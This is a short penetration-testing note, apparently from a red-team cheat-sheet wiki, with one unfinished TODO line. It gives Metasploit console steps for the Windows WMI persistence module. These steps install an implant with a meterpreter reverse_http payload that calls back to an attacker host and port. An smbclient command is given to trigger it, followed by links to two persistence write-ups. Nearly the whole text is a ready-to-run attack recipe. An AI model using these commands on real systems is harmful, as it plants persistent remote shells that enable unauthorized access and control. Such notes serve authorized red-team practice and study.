# Metasploit

TODO: Fill this info

```
msf > use exploit/windows/local/wmi_persistence

set session <session_ID>

set callback_interval 60000

set username_trigger <any_real_username>

set payload windows/x64/meterpreter/reverse_http

set lhost <IP>

set lport <PORT>

run
```

Trigger the implant with `smbclient` or wait for someone to authenticate.

```
$ smbclient //<target_IP>//C$ -U <any_real_username> <any_password>
```

---
## References

- [Liberty Shell: WMI Persistence](https://liberty-shell.com/sec/2019/06/16/wmi-persistence/)

- [Pentestlab: Persistence â€“ WMI Event Subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)